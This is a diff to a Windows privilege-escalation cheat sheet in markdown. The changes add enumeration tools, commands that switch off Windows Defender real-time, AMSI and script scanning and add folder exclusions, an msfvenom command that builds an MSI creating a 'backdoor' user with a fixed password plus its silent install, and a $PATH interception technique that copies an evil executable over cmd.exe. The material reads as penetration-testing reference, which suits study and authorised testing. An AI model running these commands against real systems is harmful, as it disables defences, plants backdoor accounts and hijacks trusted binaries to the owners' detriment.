@@ -52,6 +52,7 @@
   * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
   * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
   * [CVE-2019-1388](#cve-2019-1388)
+* [EoP - $PATH Interception](#eop---path-interception)
 * [References](#references)
 
 ## Tools
@@ -86,6 +87,16 @@
     powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
     ```
 - [winPEAS - Windows Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
+- [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng)
+    ```powershell
+    # First obtain systeminfo
+    systeminfo
+    systeminfo > systeminfo.txt
+    # Then feed it to wesng
+    python3 wes.py --update-wes
+    python3 wes.py --update
+    python3 wes.py systeminfo.txt
+    ```
 
 ## Windows Version and Configuration
 
@@ -231,6 +242,7 @@ List all network shares
 
 ```powershell
 net share
+powershell Find-DomainShare -ComputerDomain domain.local
 ```
 
 SNMP Configuration
@@ -242,6 +254,8 @@ Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 
 ## Antivirus & Detections
 
+Enumerate antivirus on a box with `WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`
+
 ### Windows Defender
 
 ```powershell
@@ -251,6 +265,13 @@ PS C:\> Get-MpComputerStatus
 # disable Real Time Monitoring
 PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
 PS C:\> Set-MpPreference -DisableIOAVProtection $true
+
+# disable AMSI (set to 0 to enable)
+PS C:\> Set-MpPreference -DisableScriptScanning 1 
+
+# exclude a folder
+PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
+PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
 ```
 
 ### AppLocker Enumeration
@@ -261,8 +282,7 @@ PS C:\> Set-MpPreference -DisableIOAVProtection $true
 List AppLocker rules
 
 ```powershell
-PS C:\> $a = Get-ApplockerPolicy -effective
-PS C:\> $a.rulecollections
+PowerView PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 
 ### Powershell
@@ -766,16 +786,23 @@ Check if these registry values are set to "1".
 ```bat
 $ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 $ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+$ Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
+$ Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
 ```
 
 Then create an MSI package and install it.
 
 ```powershell
 $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
+$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
 $ msiexec /quiet /qn /i C:\evil.msi
 ```
 
-Technique also available in Metasploit : `exploit/windows/local/always_install_elevated`
+Technique also available in :
+* Metasploit : `exploit/windows/local/always_install_elevated`
+* PowerUp.ps1 : `Get-RegistryAlwaysInstallElevated`, `Write-UserAddMSI`
+
 
 ## EoP - Insecure GUI apps
 
@@ -1177,6 +1204,29 @@ Failing on :
 
 Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege
 
+
+## EoP - $PATH Interception
+
+Requirements:
+- PATH contains a writeable folder with low privileges.
+- The writeable folder is _before_ the folder that contains the legitimate binary.
+
+EXAMPLE:
+```
+//(Powershell) List contents of the PATH environment variable
+//EXAMPLE OUTPUT: C:\Program Files\nodejs\;C:\WINDOWS\system32
+$env:Path
+
+//See permissions of the target folder
+//EXAMPLE OUTPUT: BUILTIN\Users: GR,GW
+icacls.exe "C:\Program Files\nodejs\"
+
+//Place our evil-file in that folder.
+copy evil-file.exe "C:\Program Files\nodejs\cmd.exe"
+```
+
+Because (in this example) "C:\Program Files\nodejs\" is _before_ "C:\WINDOWS\system32\" on the PATH variable, the next time the user runs "cmd.exe", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder. 
+
 ## References
 
 * [Windows Internals Book - 02/07/2017](https://docs.microsoft.com/en-us/sysinternals/learn/windows-internals)
@@ -1211,3 +1261,4 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [Abusing Diaghub - xct - March 07, 2019](https://vulndev.io/howto/2019/03/07/diaghub.html)
 * [Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html)
 * [Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019](https://itm4n.github.io/usodllloader-part2/)
+* [Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows](https://www.elladodelmal.com/2020/03/hacking-trick-environment-variable-path.html?m=1)
